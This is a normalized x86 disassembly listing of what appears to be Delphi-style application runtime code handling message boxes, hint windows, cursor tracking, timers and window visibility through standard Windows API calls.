je r-xdata
push 0x0
push 0x0
push 0x1f
call GetCapture
push eax
call SendMessageA
call sub_40276c
push eax
call sub_40274c
pop edx
call sub_40b23c
call sub_40274c
mov edx [ rw-data ]
call sub_4032b4
test al al
jne r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0xd2 ] 0x0
je r-xdata
call sub_40274c
mov edx eax
mov eax ebx
call sub_455790
pop esi
pop ebx
retn
call sub_40274c
mov ecx eax
mov edx esi
mov eax [ ebx + 0xd4 ]
call [ ebx + 0xd0 ]
jmp r-xdata
sub_455628
push ebp
mov ebp esp
add esp 0xffffffac
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
call GetActiveWindow
mov [ ebp - 0xc ] eax
push 0x2
mov eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x14 ] eax
push 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
je r-xdata
xor eax eax
call sub_44c338
mov [ ebp - 0x10 ] eax
call sub_44c254
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x4 ]
call sub_4545cc
test al al
je r-xdata
mov [ ebp - 0x44 ] 0x28
lea eax [ ebp - 0x44 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
lea eax [ ebp - 0x54 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call GetWindowRect
push 0x1d
push 0x0
push 0x0
mov ecx [ ebp - 0x34 ]
mov edx [ ebp - 0x3c ]
sub ecx edx
sar ecx 0x1
jns r-xdata
xor ecx ecx
push ebp
push sub_45577d
push [ fs : ecx ]
mov [ fs : ecx ] esp
push ebx
push edi
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call MessageBoxA
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_455784
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
je r-xdata
or ebx 0x100000
add ecx edx
push ecx
mov edx [ ebp - 0x38 ]
mov eax [ ebp - 0x40 ]
sub edx eax
sar edx 0x1
jns r-xdata
adc ecx 0x0
mov eax [ ebp - 0x10 ]
call sub_44c3ec
mov eax [ ebp - 0xc ]
push eax
call SetActiveWindow
mov eax [ ebp - 0x1c ]
call sub_44c25c
retn
push 0x1d
push 0x0
push 0x0
mov ecx [ ebp - 0x48 ]
mov edx [ ebp - 0x50 ]
sub ecx edx
sar ecx 0x1
jns r-xdata
add edx eax
push edx
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call SetWindowPos
adc edx 0x0
add ecx edx
push ecx
mov edx [ ebp - 0x4c ]
mov eax [ ebp - 0x54 ]
sub edx eax
sar edx 0x1
jns r-xdata
adc ecx 0x0
add edx eax
push edx
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call SetWindowPos
adc edx 0x0
sub_455790
push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x108 ] ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_45584b
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx [ esi + 0x4 ]
call sub_403f10
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push 0x10
lea edx [ ebp - 0x108 ]
mov eax ebx
call sub_455054
mov eax [ ebp - 0x108 ]
call sub_404338
push eax
mov eax [ ebp - 0x4 ]
call sub_404338
mov edx eax
mov eax ebx
pop ecx
call sub_455628
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_455852
lea eax [ ebp - 0x108 ]
call sub_403e78
lea eax [ ebp - 0x4 ]
call sub_403e78
retn
mov eax [ ebp - 0x4 ]
call sub_40820c
mov edx eax
lea eax [ ebp - 0x104 ]
call sub_402c30
lea eax [ ebp - 0x104 ]
mov edx r-xdata
call sub_402a48
jbe r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_404140
sub_455868
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] dx
mov esi eax
xor ebx ebx
mov [ esp + 0x8 ] 0x1
mov eax [ rw-data ]
mov edi [ eax + 0x68 ]
test edi edi
je r-xdata
cmp [ esi + 0xf2 ] 0x0
je r-xdata
cmp [ edi + 0x2aa ] 0x0
je r-xdata
test edi edi
je r-xdata
lea eax [ esp + 0x8 ]
push eax
mov ecx [ esp + 0x8 ]
mov dx [ esp + 0x4 ]
mov eax [ esi + 0xf4 ]
call [ esi + 0xf0 ]
mov ebx eax
lea eax [ esp + 0x8 ]
push eax
mov ecx [ esp + 0x8 ]
mov dx [ esp + 0x4 ]
mov eax [ edi + 0x2ac ]
call [ edi + 0x2a8 ]
mov ebx eax
jmp r-xdata
cmp [ esp + 0x8 ] 0x0
je r-xdata
test [ edi + 0x1c ] 0x10
je r-xdata
mov eax ebx
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
test bl bl
jne r-xdata
mov eax edi
call sub_43b52c
cmp ax 0xffff
jne r-xdata
mov [ esp + 0x8 ] 0x0
test edi edi
je r-xdata
cmp [ edi + 0x57 ] 0x0
jne r-xdata
cmp [ esi + 0x50 ] 0x0
je r-xdata
mov eax edi
call sub_43b694
test al al
je r-xdata
cmp [ edi + 0x220 ] 0x0
jne r-xdata
cmp [ esi + 0xa4 ] 0x0
jne r-xdata
mov ebp [ esi + 0x30 ]
mov eax [ esi + 0x44 ]
test eax eax
je r-xdata
cmp [ edi + 0x23c ] 0x0
je r-xdata
mov [ esp + 0x8 ] 0x0
mov eax [ esp + 0x4 ]
push eax
movzx eax [ esp + 0x4 ]
push eax
push 0xb01f
mov eax [ esi + 0x30 ]
push eax
call PostMessageA
mov eax esi
call sub_455f0c
test al al
je r-xdata
call sub_43b390
mov ebp eax
mov eax edi
call sub_43b390
mov ebp eax
mov eax esi
call sub_455f0c
test al al
je r-xdata
mov ax [ esp ]
push eax
mov eax [ esp + 0x8 ]
push eax
mov ecx [ esi + 0x50 ]
mov edx ebp
mov eax [ esi + 0x4c ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov ebx eax
jmp r-xdata
mov ax [ esp ]
push eax
mov eax [ esp + 0x8 ]
push eax
mov ecx [ edi + 0x23c ]
mov edx ebp
mov eax [ esi + 0x4c ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov ebx eax
jmp r-xdata
sub_4559d0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_455a28
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
mov eax esi
call sub_455f0c
test al al
je r-xdata
xor ebx ebx
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_456758
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ esi + 0x4c ]
mov esi [ eax ]
call [ esi + 0xc ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_455a2f
lea eax [ ebp - 0x4 ]
call sub_403e78
retn
sub_455a38
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_455a90
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
mov eax esi
call sub_455f0c
test al al
je r-xdata
xor ebx ebx
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_456758
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ esi + 0x4c ]
mov esi [ eax ]
call [ esi + 0x10 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_455a97
lea eax [ ebp - 0x4 ]
call sub_403e78
retn
sub_455aa8
push ebx
push esi
mov ebx eax
cmp dl [ ebx + 0x88 ]
je r-xdata
pop esi
pop ebx
retn
mov eax edx
mov [ ebx + 0x88 ] al
test al al
je r-xdata
mov eax [ ebx + 0x84 ]
call sub_403128
xor eax eax
mov [ ebx + 0x84 ] eax
mov ecx ebx
mov dl 0x1
mov eax [ rw-data ]
call [ eax + 0x2c ]
mov esi eax
mov [ ebx + 0x84 ] esi
mov edx [ ebx + 0x5c ]
mov eax esi
call sub_434d54
jmp r-xdata
sub_455af8
push ebx
push esi
push edi
mov eax [ rw-data ]
call sub_4530a4
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov eax ebx
call sub_43b390
push eax
call IsWindowVisible
test eax eax
je r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_453090
mov ebx eax
mov eax ebx
call sub_43b694
test al al
je r-xdata
mov eax ebx
call sub_43b390
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xdc ]
sub_455b5c
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx eax
push esp
call GetCursorPos
mov eax esp
mov dl 0x1
call sub_433460
mov edi eax
call sub_431d5c
mov esi eax
cmp edi [ ebx + 0x48 ]
je r-xdata
mov eax edi
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x48 ] 0x0
je r-xdata
test esi esi
je r-xdata
test esi esi
je r-xdata
mov [ ebx + 0x48 ] edi
cmp [ ebx + 0x48 ] 0x0
je r-xdata
cmp esi [ ebx + 0x48 ]
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb014
mov eax [ ebx + 0x48 ]
call sub_435d5c
test esi esi
je r-xdata
test esi esi
je r-xdata
cmp esi [ ebx + 0x48 ]
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb013
mov eax [ ebx + 0x48 ]
call sub_435d5c
sub_455bd4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_455ce4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_455b5c
mov ebx eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x88 ] 0x0
je r-xdata
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_453c0c
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
call sub_431cc4
mov edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_455d94
mov [ ebp - 0x5 ] 0x1
xor eax eax
push ebp
push j_sub_4035c8#3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x102 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x48 ] 0x0
jne r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
lea ecx [ ebp - 0x5 ]
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x104 ]
call [ ebx + 0x100 ]
mov eax [ ebp - 0x4 ]
call sub_45612c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_455af8
call GetCurrentThreadId
mov edx [ rw-data ]
cmp eax [ edx ]
jne r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor eax eax
call sub_4190d0
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_455ceb
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403e9c
retn
call WaitMessage
mov [ ebp - 0x5 ] 0x0
sub_455cf4
push ebx
push esi
push edi
mov edi edx
mov eax [ rw-data ]
call sub_453088
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
push 0x0
mov edx esi
mov eax [ rw-data ]
call sub_453074
movzx edx di
xor ecx ecx
call sub_435d5c
inc esi
dec ebx
jne r-xdata
sub_455d30
push ebx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
push eax
call IsIconic
test eax eax
je r-xdata
mov eax ebx
call sub_454e4c
push eax
push 0x1
push 0x80
mov eax [ ebx + 0x30 ]
push eax
call SendMessageA
mov eax ebx
call sub_454e4c
push eax
push 0xfffffff2
mov eax [ ebx + 0x30 ]
push eax
call SetClassLongA
jmp r-xdata
mov dx 0xb01d
mov eax ebx
call sub_455cf4
pop ebx
retn
push 0xffffffff
push 0x0
mov eax [ ebx + 0x30 ]
push eax
call InvalidateRect
sub_455d94
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x54 ]
mov edx esi
call sub_404284
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
lea eax [ ebx + 0x54 ]
mov edx esi
call sub_403ecc
cmp [ ebx + 0xfa ] 0x0
je r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_42e84c
mov [ ebp - 0x4 ] eax
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_441630
xor eax eax
push ebp
push sub_455e19
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_403324
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_403128
retn
mov edx ebx
mov eax [ ebx + 0xfc ]
call [ ebx + 0xf8 ]
jmp r-xdata
sub_455e28
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call IsWindowVisible
cmp eax 0x1
sbb eax eax
inc eax
cmp al [ rw-data ]
jne r-xdata
pop ebx
pop ebp
retn
cmp bl [ rw-data ]
je r-xdata
xor eax eax
mov al bl
movzx eax [ eax * 2 + rw-data ]
push eax
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call SetWindowPos
mov [ rw-data ] bl
sub_455e84
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_453088
mov esi eax
dec esi
test esi esi
jl r-xdata
push ebp
xor eax eax
call sub_455e28
pop ecx
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
cmp [ ebx + 0x190 ] 0x0
je r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_453074
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
push ebp
mov al 0x1
call sub_455e28
pop ecx
jmp r-xdata
mov eax ebx
call sub_43b694
test al al
jne r-xdata
mov eax [ ebx + 0x190 ]
push eax
mov eax ebx
call sub_43b390
push eax
call IsChild
test eax eax
jne r-xdata
sub_455f0c
push ebx
push esi
mov esi eax
xor ebx ebx
cmp [ esi + 0x4c ] 0x0
jne r-xdata
cmp [ esi + 0x4c ] 0x0
je r-xdata
lea eax [ esi + 0x4c ]
call sub_4054b4
call sub_4243b4
mov eax ebx
pop esi
pop ebx
retn
mov bl 0x1
sub_455f34
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov eax edi
call sub_455f78
push sub_453c64
push esi
push 0x0
push 0x0
call SetTimer
mov [ edi + 0x8a ] ax
mov [ edi + 0x89 ] bl
cmp [ edi + 0x8a ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_45612c
sub_455fa0
push ebx
push esi
push edi
push ebp
add esp 0xffffffe0
mov ebp ecx
mov edi edx
mov esi eax
lea edx [ esp + 0x18 ]
mov eax [ ebp + 0x8 ]
call sub_406878
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax edi
call sub_4346cc
lea eax [ esp + 0x10 ]
mov dl 0x1
call sub_433460
call sub_453c44
mov ebx eax
test ebx ebx
je r-xdata
mov eax esi
call sub_45612c
jmp r-xdata
cmp [ ebx + 0x99 ] 0x0
jne r-xdata
add esp 0x20
pop ebp
pop edi
pop esi
pop ebx
retn
cmp ebx [ esi + 0x60 ]
jne r-xdata
mov al [ esi + 0x58 ]
mov [ esp + 0x4 ] al
cmp [ esp + 0x4 ] 0x0
je r-xdata
lea edx [ esp + 0x18 ]
mov eax [ ebp + 0x8 ]
call sub_406878
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax edi
call sub_4346cc
push [ esp + 0x14 ]
push [ esp + 0x14 ]
lea eax [ esi + 0x64 ]
push eax
call PtInRect
test eax eax
jne r-xdata
mov eax [ esi + 0x78 ]
mov [ esp ] eax
mov eax [ esi + 0x80 ]
mov [ esp ] eax
jmp r-xdata
mov eax esi
call sub_45612c
mov al [ esp + 0x4 ]
mov [ esi + 0x58 ] al
mov [ esi + 0x60 ] ebx
xor ecx ecx
mov edx [ esp ]
mov eax esi
call sub_455f34
cmp [ esp ] 0x0
jne r-xdata
mov eax esp
push eax
xor ecx ecx
mov cl [ esp + 0x8 ]
mov edx 0xb041
mov eax ebx
call sub_435d5c
cmp [ esp + 0x4 ] 0x0
je r-xdata
mov al [ esp + 0x4 ]
mov [ esi + 0x58 ] al
mov [ esi + 0x60 ] ebx
lea eax [ esp + 0x5 ]
push eax
call GetCursorPos
lea edx [ esp + 0x5 ]
mov eax esi
call sub_4563c4
jmp r-xdata
sub_4560b0
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_455f78
mov al [ ebx + 0x89 ]
sub al 0x1
jb r-xdata
push esp
call GetCursorPos
mov edx esp
mov eax ebx
call sub_4563c4
jne r-xdata
pop ecx
pop edx
pop ebx
retn
mov eax ebx
call sub_4560e8
jmp r-xdata
sub_4560e8
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x84 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_43b694
test al al
je r-xdata
mov eax [ ebx + 0x84 ]
call sub_43b390
push eax
call IsWindowVisible
test eax eax
je r-xdata
push 0x0
mov eax [ ebx + 0x84 ]
call sub_43b390
push eax
call ShowWindow
sub_45612c
push ebx
mov ebx eax
cmp [ ebx + 0x60 ] 0x0
je r-xdata
pop ebx
retn
mov eax ebx
call sub_4560e8
xor eax eax
mov [ ebx + 0x60 ] eax
mov [ ebx + 0x58 ] 0x0
call sub_453dcc
mov eax ebx
call sub_455f78
sub_456164
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
push 0xe
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x28 ]
push eax
call GetCursor
push eax
call GetIconInfo
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor edx edx
push ebp
push sub_4562a6
push [ fs : edx ]
mov [ fs : edx ] esp
lea ecx [ ebp - 0xc ]
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x1c ]
call sub_41e740
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0xc ]
call sub_4079b8
mov [ ebp - 0x10 ] eax
xor edx edx
push ebp
push sub_456277
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx [ ebp - 0x10 ]
add ebx [ ebp - 0x8 ]
push ebx
mov esi [ ebp - 0x10 ]
mov ecx esi
xor edx edx
mov eax [ ebp - 0x1c ]
call sub_41e7f8
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45627e
mov edx [ ebp - 0x8 ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
call sub_4026dc
retn
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xe ] 0x1
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx eax
movzx ecx [ esi + 0xe ]
imul edx ecx
add edx 0x1f
and edx 0xffffffe0
test edx edx
jns r-xdata
sar edx 0x3
mov [ ebp - 0x14 ] edx
mov edi eax
imul edi [ ebp - 0x14 ]
add ebx [ ebp - 0xc ]
sub ebx edi
mov ecx 0xff
mov edx edi
mov eax ebx
call sub_456154
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
add edx 0x7
mov eax [ ebp - 0x4 ]
cdq
idiv [ ebp - 0x14 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x20 ]
sub [ ebp - 0x4 ] eax
mov eax [ esi + 0x8 ]
mov edx [ esi + 0x4 ]
add edx edx
cmp eax edx
jl r-xdata
mov eax ebx
sub eax edi
xor ecx ecx
mov edx edi
call sub_456154
mov [ ebp - 0x4 ] eax
sub_45627e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x18 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1c ]
test eax eax
je r-xdata
push eax
call DeleteObject
retn
push eax
call DeleteObject
sub_4562b8
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x84 ]
test esi esi
je r-xdata
mov ebx [ rw-data ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x84 ]
call sub_403128
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x4 ]
mov dl 0x1
mov eax ebx
call [ eax + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov [ edx + 0x84 ] eax
mov eax [ ebp + 0x8 ]
mov eax esi
call sub_403070
cmp ebx eax
je r-xdata
pop esi
pop ebx
pop ebp
retn
sub_456318
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor edx edx
mov [ ebp - 0x8 ] edx
xor edx edx
push ebp
push sub_4563b2
push [ fs : edx ]
mov [ fs : edx ] esp
xor edx edx
mov [ ebp - 0x4 ] edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4563b9
lea eax [ ebp - 0x8 ]
call sub_403e78
retn
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov esi ebx
jmp r-xdata
mov al [ ebx ]
test al al
je r-xdata
mov ecx ebx
sub ecx esi
lea eax [ ebp - 0x8 ]
mov edx esi
call sub_403f68
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x84 ]
mov eax [ eax + 0x208 ]
mov edx [ ebp - 0x8 ]
call sub_41d2dc
cmp eax [ ebp - 0x4 ]
jle r-xdata
sub al 0xa
je r-xdata
cmp [ ebx ] 0xd
jne r-xdata
mov [ ebp - 0x4 ] eax
sub al 0x3
jne r-xdata
cmp [ ebx ] 0xa
jne r-xdata
inc ebx
mov eax ebx
call sub_40bee8
mov ebx eax
inc ebx
sub_4563c4
push ebp
mov ebp esp
add esp 0xffffff70
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8c ] ecx
mov [ ebp - 0x90 ] ecx
mov esi edx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x60 ]
mov edx [ r-xdata ]
call sub_4047e4
lea ebx [ ebp - 0x4 ]
xor eax eax
push ebp
push sub_45674a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
mov [ eax + 0x58 ] 0x0
mov eax [ ebx ]
cmp [ eax + 0x88 ] 0x0
je r-xdata
mov eax [ ebp - 0x30 ]
test eax eax
jle r-xdata
mov eax [ ebx ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
mov eax [ ebx ]
call sub_45612c
xor ecx ecx
mov edx eax
mov eax [ ebx ]
call sub_455f34
jmp r-xdata
call sub_44c504
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_456751
lea eax [ ebp - 0x90 ]
mov edx 0x2
call sub_403e9c
lea eax [ ebp - 0x60 ]
mov edx [ r-xdata ]
call sub_4048a8
retn
lea eax [ ebp - 0xc ]
mov dl 0x1
call sub_433460
call sub_453c44
mov edx [ ebx ]
cmp eax [ edx + 0x60 ]
jne r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov [ ebp - 0x60 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x58 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x54 ] eax
call sub_456164
add [ ebp - 0x54 ] eax
mov eax [ rw-data ]
call sub_453008
mov [ ebp - 0x50 ] eax
mov eax [ ebx ]
mov eax [ eax + 0x5c ]
mov [ ebp - 0x4c ] eax
lea edx [ ebp - 0x80 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_434554
lea esi [ ebp - 0x80 ]
lea edi [ ebp - 0x48 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea edx [ ebp - 0x14 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
mov eax [ ebx ]
mov esi [ eax + 0x60 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x40 ]
jmp r-xdata
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x1c ]
sub eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x48 ]
push eax
call OffsetRect
lea ecx [ ebp - 0x88 ]
lea edx [ ebp - 0xc ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_4346f8
mov eax [ ebp - 0x88 ]
mov [ ebp - 0x38 ] eax
mov eax [ ebp - 0x84 ]
mov [ ebp - 0x34 ] eax
lea edx [ ebp - 0x90 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_453c0c
mov eax [ ebp - 0x90 ]
lea edx [ ebp - 0x8c ]
call sub_431c80
mov edx [ ebp - 0x8c ]
lea eax [ ebp - 0x28 ]
call sub_403f10
xor eax eax
mov [ ebp - 0x30 ] eax
mov eax [ ebx ]
mov eax [ eax + 0x74 ]
mov [ ebp - 0x2c ] eax
mov eax [ rw-data ]
mov [ ebp - 0x5c ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
lea eax [ ebp - 0x60 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
xor ecx ecx
mov edx 0xb030
call sub_435d5c
test eax eax
sete [ ebp - 0x1d ]
cmp [ ebp - 0x1d ] 0x0
je r-xdata
cmp [ esi + 0x190 ] 0x0
je r-xdata
cmp [ ebp - 0x1d ] 0x0
je r-xdata
mov eax [ ebx ]
cmp [ eax + 0x132 ] 0x0
je r-xdata
lea eax [ ebp - 0x1c ]
push eax
mov eax [ esi + 0x190 ]
push eax
call ClientToScreen
xor eax eax
jmp r-xdata
mov eax [ ebx ]
cmp [ eax + 0x60 ] 0x0
jne r-xdata
lea eax [ ebp - 0x60 ]
push eax
lea ecx [ ebp - 0x1d ]
lea edx [ ebp - 0x28 ]
mov esi [ ebx ]
mov eax [ esi + 0x134 ]
call [ esi + 0x130 ]
mov edx [ ebx ]
mov [ edx + 0x58 ] al
mov eax [ ebx ]
cmp [ eax + 0x58 ] 0x0
je r-xdata
mov al 0x1
cmp [ ebp - 0x28 ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x5c ]
call sub_4562b8
pop ecx
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov dl [ eax + 0x5f ]
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov ecx [ ebp - 0x28 ]
mov edx [ ebp - 0x50 ]
mov esi [ eax ]
call [ esi + 0xd8 ]
mov eax [ ebp - 0x54 ]
push eax
mov eax [ ebp - 0x58 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
call OffsetRect
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov si 0xffc8
call sub_403324
test al al
je r-xdata
lea ecx [ ebp - 0x88 ]
lea edx [ ebp - 0x48 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_4346cc
mov eax [ ebx ]
mov edx [ ebp - 0x88 ]
mov [ eax + 0x64 ] edx
mov edx [ ebp - 0x84 ]
mov [ eax + 0x68 ] edx
lea ecx [ ebp - 0x88 ]
lea edx [ ebp - 0x40 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_4346cc
